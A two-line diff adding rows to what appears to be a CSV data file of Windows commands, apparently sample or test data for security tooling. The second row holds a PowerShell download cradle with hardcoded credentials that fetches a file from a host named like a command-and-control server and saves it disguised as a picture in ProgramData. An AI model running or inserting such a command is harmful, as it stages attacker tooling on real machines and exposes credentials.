@@ -1,0 +1,2 @@
+1, "ls c:\",,
+2, "$wc = New-Object Net.WebClient;$wc.Credentials = new-object System.Net.NetworkCredential('boris', 'B0r1s2012', 'candc');$wc.downloadfile('https://candc.cloudapp.net/toolz/boris.jpg', 'c:\programdata\mypicture.jpg')",,
